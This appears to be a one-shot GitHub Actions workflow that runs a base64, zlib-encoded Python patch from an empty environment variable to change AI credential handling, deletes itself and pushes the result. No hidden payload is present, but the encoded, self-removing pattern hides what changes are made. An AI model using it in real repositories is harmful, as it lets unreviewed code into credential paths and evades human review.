name: Apply finisher credential resolver fix

on:
  push:
    branches:
      - fix/finisher-ai-credential-resolution
    paths:
      - .github/workflows/apply-ai-credential-fix.yml

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: fix/finisher-ai-credential-resolution
          fetch-depth: 0

      - name: Apply targeted credential patches
        env:
          PATCH_ZLIB_B64: ""
        run: |
          python3 -c 'import os,base64,zlib; open("/tmp/patch.py","wb").write(zlib.decompress(base64.b64decode(os.environ["PATCH_ZLIB_B64"])))'
          python3 /tmp/patch.py

      - name: Remove one-shot workflow
        run: rm .github/workflows/apply-ai-credential-fix.yml

      - name: Commit patches
        shell: bash
        run: |
          git config user.name "repo-finisher-maintenance"
          git config user.email "actions@users.noreply.github.com"
          git add -A
          git commit -m "fix: resolve encrypted AI credentials before finisher calls"
          git push origin HEAD:fix/finisher-ai-credential-resolution
